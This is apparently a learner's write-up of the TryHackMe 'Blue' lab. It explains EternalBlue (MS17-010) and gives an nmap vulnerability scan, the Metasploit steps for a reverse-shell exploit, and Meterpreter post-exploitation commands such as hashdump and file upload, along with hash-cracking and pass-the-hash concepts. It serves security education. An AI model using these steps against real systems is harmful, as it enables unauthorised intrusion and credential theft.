# Blue — TryHackMe Writeup

## Overview
| Field | Details |
|-------|---------|
| Platform | TryHackMe |
| Room | Blue |
| Path | Cyber Security 101 |
| Difficulty | Easy |
| Date | May 2026 |
| Author | Ibrahim Babarinde |

---

## What The Room Is About

Blue is one of the most important beginner rooms on TryHackMe. It walks
you through exploiting a real Windows machine vulnerable to EternalBlue —
one of the most infamous exploits in cybersecurity history. The room
covers the full basic penetration testing lifecycle: reconnaissance,
exploitation, and post-exploitation. It is entirely hands-on and
scenario based, which makes the learning stick in a way theory never can.

---

## Tools Used

- Nmap
- Metasploit Framework
- Meterpreter

---

## Key Concepts Covered

### 1. The Vulnerability — MS17-010 (EternalBlue)

The vulnerability exploited in this room is **MS17-010**, commonly known
as **EternalBlue.**

**CVE:** CVE-2017-0144

EternalBlue is a critical vulnerability in Microsoft's implementation
of the **SMB (Server Message Block)** protocol — the protocol Windows
uses to share files, printers, and other resources across a network.
The vulnerability allows an attacker to send specially crafted packets
to a target machine running an unpatched version of SMB, which causes
a buffer overflow and allows remote code execution without any
authentication.

In plain terms — if a Windows machine is unpatched and has SMB exposed,
an attacker can run any code they want on it remotely, without needing
a username or password.

**Why EternalBlue is famous:**
This exploit was originally developed by the **NSA (National Security
Agency)** as a cyberweapon. It was stolen and leaked by a hacking group
called The Shadow Brokers in 2017. Shortly after, it was used in the
**WannaCry ransomware attack** — one of the largest cyberattacks in
history — which infected over 200,000 machines across 150 countries,
crippling hospitals, banks, and government systems worldwide.

Microsoft had released a patch (MS17-010) before WannaCry, but
millions of machines were still unpatched when the attack hit.
This is why patch management is one of the most critical aspects
of cybersecurity.

---

### 2. Reconnaissance — Scanning With Nmap

The first step of any penetration test is reconnaissance — finding out
as much as possible about the target before attempting to exploit it.

In this room, **Nmap** was used to scan the target machine:

```bash
nmap -sV -sC --script vuln 10.10.10.x
```

| Flag | Meaning |
|------|---------|
| `-sV` | Detects service versions running on open ports |
| `-sC` | Runs default Nmap scripts against the target |
| `--script vuln` | Runs vulnerability detection scripts |

**What the scan revealed:**
- Port 445 was open — this is the SMB port
- The target was running an unpatched version of Windows
- The Nmap vulnerability scripts confirmed the machine was vulnerable
to **MS17-010 (EternalBlue)**

This is exactly how a real penetration tester works. You never guess
what is on a machine — you scan it first, identify what is running,
and then choose your exploit based on what the evidence tells you.

---

### 3. Exploitation — Using Metasploit

Once the vulnerability was confirmed, **Metasploit** was used to
exploit it.

Metasploit is the world's most widely used penetration testing
framework. It contains hundreds of pre-built exploits, payloads,
and auxiliary modules that allow penetration testers to quickly
exploit known vulnerabilities against target systems.

**The steps inside Metasploit:**

```bash
# Launch Metasploit
msfconsole

# Search for the EternalBlue exploit module
search ms17-010

# Select the exploit module
use exploit/windows/smb/ms17_010_eternalblue

# Set the target IP address
set RHOSTS 10.10.10.x

# Set the payload
set payload windows/x64/shell/reverse_tcp

# Run the exploit
run
```

When the exploit succeeds, Metasploit establishes a connection to the
target machine — giving you control over it remotely.

---

### 4. What Is Meterpreter?

After successful exploitation, the room upgrades the basic shell
to a **Meterpreter** session.

Meterpreter is an advanced, interactive payload within Metasploit
that runs entirely in the target machine's memory — meaning it leaves
minimal traces on the disk, making it harder to detect.

More importantly, Meterpreter is confirmation that your exploit worked
and you have an active, live connection to the remote machine. It gives
you a powerful command interface to interact with the target system.

**What you can do inside a Meterpreter session:**

```bash
# See who you are on the target machine
getuid

# See system information
sysinfo

# Dump password hashes from the machine
hashdump

# Navigate the file system
ls
cd
pwd

# Upload or download files
download file.txt
upload malware.exe
```

This is post-exploitation — what happens after you get in. In a real
penetration test, this phase is about demonstrating impact: what could
a real attacker actually do with this access?

---

### 5. Password Hashing And Hash Dumping

After gaining Meterpreter access, the room covers extracting password
hashes from the machine using the `hashdump` command.

**What is password hashing?**
When Windows stores passwords, it does not store them in plain text.
Instead it runs them through a hashing algorithm — a mathematical
function that converts the password into a fixed-length string of
characters called a hash.

For example, the password `admin123` might become:
```
aad3b435b51404eeaad3b435b51404ee:e10adc3949ba59abbe56e057f20f883e
```

The idea is that hashes are one-way — you cannot reverse them directly
to get the original password. However they can be cracked by:

- **Dictionary attacks** — hashing words from a wordlist and comparing
them to the target hash until one matches
- **Pass the hash** — in some cases you do not even need to crack the
hash, you can use it directly to authenticate to other systems

**Tools used to crack hashes:**
- **John the Ripper**
- **Hashcat**
- **Online hash lookup sites** like crackstation.net

In real penetration testing, dumping and cracking password hashes
is critical because it can give you credentials that work on other
machines in the same network — a technique called **lateral movement.**

---

## What I Learned

Blue was the most impactful room I had completed up to that point
because it was the first time I went through a complete penetration
testing scenario from start to finish:

**Scan → Identify vulnerability → Exploit → Get access → Post exploitation**

That full lifecycle — even in a controlled lab environment — makes
everything click in a way that reading about it never does.

**Specific lessons:**

**1. Patch management is everything**
EternalBlue only works on unpatched machines. Microsoft released the
patch before WannaCry hit. Every machine that was destroyed by WannaCry
could have been protected by a simple update. This taught me that
the most devastating attacks often exploit old, known vulnerabilities
against systems that simply were not kept up to date.

**2. Nmap is non-negotiable**
You cannot exploit what you do not know exists. Nmap told me exactly
what was running, what version it was, and whether it was vulnerable —
before I touched a single exploit. Reconnaissance is always step one.

**3. Metasploit removes the complexity barrier**
Metasploit handles the complex exploit code so you can focus on
understanding the methodology. But this is also a warning — using
Metasploit without understanding what the exploit actually does
creates a dangerous gap in knowledge. Always study the vulnerability
behind the module, not just the module itself.

---

## Important Note On Ethics

EternalBlue is an extremely powerful exploit that caused catastrophic
damage when used maliciously. Everything practiced in this room was
done on a dedicated TryHackMe lab machine in a completely isolated
environment. Using this exploit against any machine without explicit
written permission is illegal and harmful.

---

## Resources

- [TryHackMe — Blue](https://tryhackme.com/room/blue)
- [MS17-010 Microsoft Advisory](https://docs.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010)
- [EternalBlue Explained](https://www.avast.com/c-eternalblue)
- [Metasploit Documentation](https://docs.metasploit.com/)
- [WannaCry Attack Overview](https://www.kaspersky.com/resource-center/threats/ransomware-wannacry)

---

*Written by Ibrahim Babarinde | [GitHub](https://github.com/ibrahim-babarinde) | [TryHackMe](https://tryhackme.com)*
